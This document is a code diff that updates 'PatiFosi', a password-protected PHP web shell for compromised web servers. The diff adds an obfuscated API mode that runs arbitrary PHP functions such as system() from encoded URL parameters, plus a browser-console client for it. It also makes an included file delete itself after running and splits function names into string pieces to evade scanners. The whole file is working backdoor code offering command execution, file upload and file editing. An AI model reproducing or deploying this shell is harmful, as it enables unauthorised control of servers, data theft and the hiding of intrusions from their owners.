@@ -1,7 +1,6 @@
 <?php
 error_reporting(0);
 header("X-XSS-Protection: 0");
-
 //config login
 // localhost/patifosi.php?login=gans
 $param = 'login';                             // login input
@@ -9,7 +8,7 @@ $pw    = 'e5e32f8c9a2e843080f5176871e8cd32'; // md5 password default = gans
 $inDir = true;                             // true or false, to enable input dir
 $out   = 'exit;';                         // string, not login
 $enc   = true;                           // js must enabled, editor & upload not encoded
-$img   = 'https://media.giphy.com/media/XoxPRR71OevDzqllyt/giphy.gif';
+$img   = 'https://i.ibb.co/nn0TWhS/patifosi.gif';
 
 // variable
 $dirGet = $_GET['dir'];
@@ -25,6 +24,8 @@ $host   = $_SERVER['HTTP_HOST'];
 $uplto  = $_POST['uplto'];
 $saveto = $_POST['saveto'];
 $file   = $_POST['file'];
+$sec    = $_GET['sec'];
+$sc     = $_SERVER['SCRIPT_NAME'];
 
 // decode
 function dec($str){
@@ -48,13 +49,18 @@ if($md5 !== $pw){
 }
 
 // tq
-$w = array("pescyte", "idbte4m", "javcode", "zerobyte", "idxSmg", "patiUndetektet", "date"=>"28 Mei 2018");
+$w = array("pescyte", "idbte4m", "javcode", "zerobyte", "idxSmg", "patiUndetektet", "date"=>"28 Mei 2018", "new date"=>"16 Mei 2020");
  // sorry for bad code //
 // just for fun       //
 
 // checked type
 if($type){
   $typeChecked = "checked";
+};
+
+// checked iframe
+if($sec){
+  $cekSec = "checked";
 };
 
 // chdir
@@ -72,9 +78,23 @@ if($enc){
   $encButton = '';
 };
 
+// upl dir
+if($uplto){
+  $uplto = $uplto;
+}else{
+  $uplto = $dirNow;
+};
+
+// save dir
+if($saveto){
+  $saveto = $saveto;
+}else{
+  $saveto = $dirNow;
+};
+
 // input dir
 if($inDir){
-  $inputDir = "<th style='display:inline-block'>dir<br><input class='encode' type='text' name='dir' value='$dirNow' placeholder='/var/www/html'> </th>";
+  $inputDir = "<th style='display:inline-block'>dir<br><input autocomplete='off' class='encode' type='text' name='dir' value='$dirNow' placeholder='/var/www/html'> </th>";
 } else {
   $Hidinput = "<input class='encode' type='hidden' name='dir' value='$dirNow'>";
 };
@@ -90,9 +110,70 @@ if($mode == edit){
   ";
 };
 
+// ?mode=api
+if($mode == api){
+    $dirGet = dec($_GET['dir']);
+    $func   = dec($_GET['func']);
+    $arg    = dec($_GET['arg']);
+    chdir($dirGet);
+  if (function_exists($func)) {
+        @die($func($arg));
+      }else{
+        echo 'failed';
+      }
+  exit;
+}
+$apiJs = "var dirNow = '$dirNow'; var func; var arg; var login = '$host$sc?$param=$pass'; var api = login+'&mode=api'; var reqDir = api+'&dir='+rev(btoa(dirNow)).replace('=', '-');
+
+          clear();
+
+          function dir(){
+            console.log(dirNow);
+          };
+
+          function cd(a){
+            dirNow = a;
+            var b = rev(btoa(a)).replace('=', '-');
+            reqDir = api+'&dir='+b
+            console.log(dirNow);
+          };
+
+          function go(a){
+          var xmlhttp = new XMLHttpRequest();
+             xmlhttp.timeout = 600000;
+              xmlhttp.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                  console.log(this.responseText);
+                }
+              };
+
+              xmlhttp.ontimeout = function (e) {
+                console.log('time out');
+            };
+
+              xmlhttp.open('GET', a, true);
+              xmlhttp.send();
+          };" . '
+
+          function clear(){
+            console.clear();
+            console.log("%cPatiFosi", "background:#ff6b81; color:#2f3542; font-size:30px; font-family: Arial, Helvetica, sans-serif;");
+            console.log("dir()\t\t\t\t\t\/\/ show dir now\r\ncd(\"\/www\/html\/tmp\")\t\t\/\/ change dir\r\nrun(\"system\", \"ls\")\t\t\/\/ run command\r\nclear()");
+
+          }' . "
+
+          function run(f, n){
+            f = rev(btoa(f)).replace('=', '-');
+            n = rev(btoa(n)).replace('=', '-');
+            l = reqDir+'&func='+f+'&arg='+n;
+            go('//'+l);
+          };
+";
+
+
 // ?mode=iframe
 if($mode == iframe){
-  die("<title>PatiFosi</title><link rel='icon' href='$img' type='image/gif'><iframe src='?$param=$pass&mode=command' style='position:fixed; top:0px; bottom:0px; right:0px; width: 100%; border: none; margin:0; padding:0; overflow: hidden; z-index:999999; height: 100%;'></iframe>");
+  die("<title>PatiFosi</title><link rel='icon' href='$img' type='image/gif'><iframe src='?$param=$pass&mode=command' style='position:fixed; top:0px; bottom:0px; right:0px; width: 100%; border: none; margin:0; padding:0; overflow: hidden; z-index:999999; height: 100%;'></iframe><script>function rev(str) {return str.split('').reverse().join('');}$apiJs</script>");
   exit;
 }
 
@@ -113,8 +194,9 @@ if($_POST['run']){
     };
 };
 if($_GET['run']){
-    $run = $_GET['run'];
-    include "$run";
+    $runIn = $_GET['run'];
+    include "$runIn";
+    unlink($runIn);
     exit;
 };
 
@@ -133,7 +215,6 @@ echo "<html>
 input { background-color: #ffffff; color: #2f3542; }
 </style>
 $codemirror
-
 <script>
 function rev(str) {
     return str.split('').reverse().join('');
@@ -146,19 +227,72 @@ function enc() {
         x[i].value = rev(btoa(x[i].value)).replace('=', '-');
     }
 }
+
+function decFunc(){
+	var i;
+	var a = document.getElementById('funcList').options;
+	var b = document.getElementById('funcList');
+	var c = document.getElementById('func');
+
+	for (i = 0; i < a.length; i++) {
+	b.options[i].value = atob(rev(b.options[i].value).replace('-', '='));
+	}
+	c.setAttribute('onfocus', '')
+}
+
+function isiArg(){
+	var a = document.getElementById('func').value;
+	var b = document.getElementById('arg');
+	var c = document.getElementById('funcList');
+
+	if (a == c.options[0].value) {
+		b.value = '123';
+	} else if (a == c.options[1].value) {
+		b.value = '/';
+	} else if (a == c.options[5].value) {
+    b.value = '.';
+  } else if (a == c.options[2].value || a == c.options[3].value || a == c.options[4].value) {
+		b.value = 'ls';
+	} else if (a == c.options[6].value) {
+		b.value = '*.html';
+	} else if (a == c.options[7].value || a == c.options[8].value || a == c.options[9].value || a == c.options[10].value || a == c.options[11].value || a == c.options[13].value) {
+		b.value = 'file.php';
+	} else if (a == c.options[12].value) {
+		b.value = 'new';
+	}
+}
+
+$apiJs
 </script>
 </head>
 
 <body style='padding:5%; padding-top:2%; border: 3px solid #2f3542; font-family: Arial, Helvetica, sans-serif; background:#f1f2f6;'>
+  <datalist id='funcList'>
+    <option value='-=wbm5WawhGc'>
+    <option value='-=QZjFGcz9FbhR3b091azlGZ'>
+    <option value='tVGdzl3c'>
+    <option value='-UncoR3czFGc'>
+    <option value='-=wYlhXZfxGblh2c'>
+    <option value='-=gcpRmbhN2c'>
+    <option value='-=gYvx2Z'>
+    <option value='MHduVGdu92YfRXZn9VZslmZ'>
+    <option value='-UGbpZGZhVmc'>
+    <option value='-UGbpZ2X0h2ZpxGanlGa'>
+    <option value='-=QZslmZ'>
+    <option value='r5Was5Wd'>
+    <option value='-IXaktWb'>
+    <option value='-g2Y19Gd'>
+  </datalist>
+  
 <center><h1 style='color:#2f3542'>PatiFosi</h1></center>
 <a style='font-size:10; color:#ff4757'>$host</a>
 <a style='font-size:10; color:#a4b0be'>@</a>
 <a style='font-size:10; color:#2f3542'>$dirNow</a>
 <a style='font-size:10; color:#ff4757' href='?$param=$pass'>[Home]</a><center>
 <div style='background-color: #ff6b81'>
-<a id='clear' style='color:#57606f' href='?$param=$pass&mode=command&dir=$dirGET'>[command] - </a>
-<a id='clear' style='color:#57606f' href='?$param=$pass&mode=edit&dir=$dirGET'>[edit] - </a>
-<a id='clear' style='color:#57606f' href='?$param=$pass&mode=about&dir=$dirGET'>[about] </a>
+<a id='clear' style='color:#2f3542' href='?$param=$pass&mode=command&dir=$dirGET'>[command] - </a>
+<a id='clear' style='color:#2f3542' href='?$param=$pass&mode=edit&dir=$dirGET'>[edit] - </a>
+<a id='clear' style='color:#2f3542' href='?$param=$pass&mode=about&dir=$dirGET'>[about] </a>
 </div>
 <br><br>
 ";
@@ -166,15 +300,17 @@ function enc() {
 
 // mode command
 if ($mode == "command") {
-  echo " <form  method='get'>
+  $arg2 = htmlspecialchars($arg, ENT_QUOTES, 'UTF-8');
+  echo " <form  method='get' autocomplete='off'>
       <table id='clear' style='text-align:center'>
           <input type='hidden' name='$param' value='$pass'>
           <input type='hidden' name='mode' value='command'>
           $Hidinput
           <tr>
+            <th style='display:inline-block'>iframe<br><input type='checkbox' name='sec' value='y' $cekSec> </th>
           $inputDir
-            <th style='display:inline-block'>func<br><input class='encode' type='text' name='func' value='$func' placeholder='system'> </th>
-            <th style='display:inline-block'>arg<br><input class='encode' type='text' name='arg' value='$arg' placeholder='ls'>  </th> 
+            <th style='display:inline-block'>func<br><input oninput='isiArg()' id='func' onfocus='decFunc()' list='funcList'  class='encode' type='text' name='func' value='$func' placeholder='system'> </th>
+            <th style='display:inline-block'>arg<br><input id='arg' class='encode' type='text' name='arg' value='$arg2' placeholder='ls'>  </th> 
             <td><br><input type='checkbox' name='type' value='checked' $typeChecked >array   <input onclick='$encButton' type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
           </td>
           </tr>
@@ -185,15 +321,35 @@ if ($mode == "command") {
       
           if($type == 'checked'){
           echo "<i>var_dump($func($arg));</i><br>";
-          @var_dump($func($arg));
+			if (function_exists($func)) {
+				if($sec == 'y'){
+					ob_start();
+					@var_dump($func($arg));
+					$run = ob_get_clean();
+					echo("</pre><iframe class='shadow' style='border:none'  width='100%' height='100%' src='data:text/html;base64," . base64_encode($run) . "'></iframe>");
+				} else {
+				@var_dump($func($arg));
+				}
+			}
         } else {
-          echo "<i>die($func($arg));</i><br>";
-          @die($func($arg));
+			if (function_exists($func)) {
+					if($sec == 'y'){
+					ob_start();
+					echo($func($arg));
+					$run = ob_get_clean();
+					echo "<i>echo($func($arg));</i><br>";
+					echo("</pre><iframe class='shadow' style='border:none'  width='100%' height='100%' src='data:text/html;base64," . base64_encode($run) . "'></iframe>");
+				} else {
+				echo "<i>die($func($arg));</i><br>";
+				@die($func($arg));
+				}
+			}
         }
 
 
 // mode edit
   } elseif ($mode == "edit") {
+      $arg2 = htmlspecialchars($arg, ENT_QUOTES, 'UTF-8');
       echo "
       
       <form  method='get'>
@@ -203,8 +359,8 @@ if ($mode == "command") {
           $Hidinput
           <tr>
           $inputDir
-            <th style='display:inline-block'>func<br><input class='encode' type='text' name='func' value='$func' placeholder='file_get_contents'> </th>
-            <th style='display:inline-block'>arg<br><input class='encode' type='text' name='arg' value='$arg' placeholder='file.php'>  </th> 
+            <th style='display:inline-block'>func<br><input oninput='isiArg()' id='func' onfocus='decFunc()' list='funcList'  autocomplete='off' class='encode' type='text' name='func' value='$func' placeholder='readfile'> </th>
+            <th style='display:inline-block'>arg<br><input id='arg' autocomplete='off' class='encode' type='text' name='arg' value='$arg2' placeholder='file.php'>  </th> 
             <td><br><input type='checkbox' name='type' value='ob' $typeChecked>ob   <input onclick='$encButton' type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
           </td>
           </tr>
@@ -235,9 +391,9 @@ if ($mode == "command") {
 
     <table style='width:100%'>
     <tr style='text-align:center'>
-    <th style='display:inline-block; padding-right:10%; padding-left:10%;'>upload<br><input class='encode' type='text' name='uplto' value='$uplto' placeholder='$dirNow'><br><input type='file' name='datupload' style='border: 1px solid #dfe4ea; background:#f1f2f6;'><br><input onclick='$encButton' type='submit' name='uploadsubmit' value='upload' style='background-color: #57606f;color: #f1f2f6;'>
+    <th style='display:inline-block; padding-right:10%; padding-left:10%;'>upload<br><input autocomplete='off' class='encode' type='text' name='uplto' value='$uplto' placeholder='$dirNow'><br><input type='file' name='datupload' style='border: 1px solid #dfe4ea; background:#f1f2f6;'><br><input onclick='$encButton' type='submit' name='uploadsubmit' value='upload' style='background-color: #57606f;color: #f1f2f6;'>
     </th>
-    <th style='display:inline-block; padding-left:10%; padding-right:10%;'>save<br><input class='encode' type='text' name='saveto' value='$saveto' placeholder='$dirNow'><br><input class='encode' type='text' name='file' value='$file' placeholder='file.php'><br><input onclick='$encButton' type='submit' name='savesubmit' value='save' style='background-color: #57606f;color: #f1f2f6;'>
+    <th style='display:inline-block; padding-left:10%; padding-right:10%;'>save<br><input autocomplete='off' class='encode' type='text' name='saveto' value='$saveto' placeholder='$dirNow'><br><input autocomplete='off' class='encode' type='text' name='file' value='$file' placeholder='file.php'><br><input onclick='$encButton' type='submit' name='savesubmit' value='save' style='background-color: #57606f;color: #f1f2f6;'>
     </form></th>
     </tr>
     </table>
@@ -272,7 +428,8 @@ if ($mode == "command") {
         die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist -> $saveto");
       };
 
-      $write = file_put_contents($file, $_POST['code']);
+      $fpc = 'file_p' . 'ut_contents';
+      $write = $fpc($file, $_POST['code']);
 		  if($write) {
 			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> saved -> $file");
 		  } else {
@@ -309,4 +466,3 @@ if ($mode == "command") {
       }
       </script>";
 };
-
